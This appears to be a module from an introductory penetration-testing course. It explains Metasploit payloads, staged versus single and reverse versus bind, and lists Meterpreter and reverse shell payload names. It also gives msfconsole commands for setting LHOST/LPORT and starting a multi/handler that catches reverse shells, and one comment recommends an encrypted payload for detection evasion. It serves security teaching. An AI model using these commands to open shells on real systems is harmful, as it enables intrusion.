# Module 08 — Payloads (1)

> 🟡 **Intermediate Level** | The code that runs on the target after successful exploitation
> 

---

# 💊 Payloads

## 🤔 What is a Payload?

A **payload** is the code that runs on the **target machine** after an exploit succeeds. The exploit opens the door; the payload is what walks through it.

---

## 🏗️ Payload Architecture

```
┌────────────────────────────────────────────┐
│                PAYLOADS                       │
│                                              │
│  ┌───────────┐  ┌──────────────────┐  │
│  │  Singles   │  │  Staged              │  │
│  │  (/)        │  │  (stager+stage)      │  │
│  └───────────┘  └──────────────────┘  │
│                                              │
│  Singles: All-in-one. No callback needed.   │
│  Staged:  Small stager calls back, then      │
│           downloads full payload (stage)     │
└────────────────────────────────────────────┘
```

### Naming Convention:

```
windows/meterpreter/reverse_tcp     ← STAGED (has /)
         ^stager^   ^---stage---^

windows/meterpreter_reverse_tcp     ← SINGLE (no /)
         ^---entire payload------^
```

---

## 🔄 Connection Directions

### Reverse Payloads (Most Common)

```
Attacker Machine          Target Machine
192.168.1.10              192.168.1.20
     ┌──────────────────────────────┤
     │   TARGET calls back to US   │
     │   (bypasses most firewalls) │
     ├──────────────────────────────┤

Payloads: reverse_tcp, reverse_https, reverse_http
```

### Bind Payloads

```
Attacker Machine          Target Machine
192.168.1.10              192.168.1.20
     ┌──────────────────────────────┤
     │   WE connect to TARGET port │
     │   (target needs open port)  │
     ├──────────────────────────────┤

Payloads: bind_tcp
```

---

## 📜 Common Payloads Reference

### Windows Payloads

```bash
# Staged Meterpreter (most used):
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp

# Encrypted (evades detection better):
windows/meterpreter/reverse_https
windows/x64/meterpreter/reverse_https

# Simple shell:
windows/shell/reverse_tcp
windows/shell_reverse_tcp          # Single

# PowerShell:
windows/x64/powershell_reverse_tcp
```

### Linux Payloads

```bash
# Linux Meterpreter:
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# Simple shell:
cmd/unix/reverse_bash
cmd/unix/reverse_netcat
linux/x86/shell_reverse_tcp
```

### Multi-Platform

```bash
# Java (cross-platform):
java/meterpreter/reverse_tcp

# Python:
python/meterpreter/reverse_tcp

# PHP:
php/meterpreter_reverse_tcp
```

---

## ⚙️ Setting Payloads

```bash
# Set payload in an exploit:
msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# See all compatible payloads:
msf6 exploit > show payloads

# Set LHOST and LPORT (required for reverse payloads):
msf6 exploit > set LHOST 192.168.1.10
msf6 exploit > set LPORT 4444

# Show payload-specific options:
msf6 exploit > show options
```

---

## 💼 The multi/handler — Catching Payloads

When you generate a standalone payload with msfvenom, use `multi/handler` to receive the connection:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.10
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j   # -j runs it as a background job

# Now send your payload to the target
# When target runs it, session opens automatically
```

---

> ✅ **Payloads understood! Now master the Meterpreter shell.**
>